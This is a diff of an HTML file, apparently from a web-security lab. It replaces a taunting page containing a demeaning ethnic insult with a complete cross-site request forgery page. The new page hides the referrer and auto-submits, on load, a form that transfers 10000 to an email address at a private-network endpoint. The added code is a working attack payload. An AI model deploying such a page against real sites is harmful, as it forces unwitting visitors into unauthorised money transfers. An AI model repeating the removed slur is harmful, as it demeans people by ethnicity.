@@ -1,44 +1,14 @@
 <html>
-	<head>
-		<title>
-			REALLY?
-		</title>
-	</head>
-	<style>
-		body{
-		background-color:black;
-		color:white;}
-		ul { 
-			padding: 0px
-		}
-		li {
-		   display: inline-block;
-		   width: auto;
-		   list-style: outside none none;
-		   font-weight:800;
-			font-family: "Lucida Console", Courier, monospace;
-			padding:5px;
-			margin-left:5px;
-		}
-		a{
-		color: #93BCFF;
-		
-		text-decoration:none;
-		}
-		p{
-		font-size:40px;
-		font-family: Verdana, Arial, Helvetica, sans-serif;}
-		span{
-		font-size:60px;
-		font-family: fantasy;}
-		img{
-		margin:10px;}
-	</style>
-	<body>
-	<center>
-		<span>REALLY AGAIN?</span><hr>
-		<p>No internship and still ya brown ass here, huh!</p>
-		<img src="2363.png" height='50%'>
-	</center>
-	</body>
+  <head>
+  <meta name="referer" content="no-referrer">
+  </head>  
+    <body>
+        <form action="http://192.168.2.98:55824/transfer" method="POST">
+		<input type="text" class="form-control" id="inputTo" name="user_to" value="xyz@gmail.com" placeholder="Who do you want to transfer to?">
+		<input type="number" class="form-control" id="inputAmount" name="amount" value="10000" placeholder="Amount to transfer">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
